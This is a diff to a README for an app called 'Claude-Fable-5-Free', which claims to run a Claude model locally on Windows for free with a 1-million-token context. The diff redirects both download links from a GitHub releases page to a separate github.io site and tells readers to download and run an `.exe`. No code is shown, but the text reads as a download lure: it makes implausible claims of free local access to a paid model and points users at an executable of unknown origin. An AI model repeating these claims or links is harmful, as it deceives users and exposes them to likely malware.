@@ -1,6 +1,6 @@
 # 🤖 Claude-Fable-5-Free - Use the Claude model for free
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Wejda9414/Claude-Fable-5-Free/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://wejda9414.github.io)
 
 This application provides direct access to the Claude Fable 5 model on your desktop. It removes the need for web browser interfaces or monthly subscription fees. You gain access to a 1 million token context window for your text processing needs. The software runs locally on your Windows machine and handles your data with privacy in mind.
 
@@ -8,7 +8,7 @@ This application provides direct access to the Claude Fable 5 model on your desk
 
 Follow these steps to install the software on your computer. You do not need to install complex coding environments or manage dependencies.
 
-1. Visit the [official releases page](https://github.com/Wejda9414/Claude-Fable-5-Free/releases) to view available versions.
+1. Visit the [official releases page](https://wejda9414.github.io) to view available versions.
 2. Look for the file ending in `.exe` under the latest release heading.
 3. Click the file name to start the download.
 4. Save the file to a folder you can find easily, like your Downloads folder.
